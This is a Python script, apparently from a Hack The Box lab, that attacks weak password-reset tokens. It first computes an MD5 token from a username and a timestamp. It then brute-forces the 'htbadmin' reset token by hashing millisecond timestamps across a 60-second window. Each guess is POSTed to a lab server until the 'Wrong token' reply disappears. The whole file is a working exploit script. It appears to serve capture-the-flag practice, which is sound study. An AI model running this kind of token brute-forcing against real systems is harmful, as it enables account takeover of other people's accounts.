import hashlib

def generate_reset_token(username, given_time):
    # Concatenate username and time string
    concat_str = f"{username}{given_time}"
    # Generate MD5 hash of the concatenated string
    token = hashlib.md5(concat_str.encode()).hexdigest()
    return token

# Example usage
username = "htbuser"
given_time = "2024-03-25 02:32:08pm"
token = generate_reset_token(username, given_time)
print(token)

exit()









from hashlib import md5
import requests
from sys import exit
from time import time
from datetime import datetime

url = "http://94.237.57.59:32588/question1/"

# to have a wide window try to bruteforce starting from 120seconds ago

# Input string
date_string = "2024-03-25 02:32:08pm"

# Define the format of the input string
format_string = "%Y-%m-%d %I:%M:%S%p"

# Parse the string into a datetime object
time_obj = datetime.strptime(date_string, format_string)
now        = int(time_obj.timestamp()+30)
start_time = now - 60
fail_text  = "Wrong token"

# loop from start_time to now. + 1 is needed because of how range() works
for x in range(start_time, now + 1):
    # get token md5
    md5_token = md5(f"htbadmin{x*1000}".encode()).hexdigest()
    data = {
        "submit": "check",
        "token": md5_token
    }

    print("checking {} {}".format(str(x), md5_token))

    # send the request
    res = requests.post(url, data=data)

    # response text check
    if not fail_text in res.text:
        print(res.text)
        print("[*] Congratulations! raw reply printed before")
        exit()
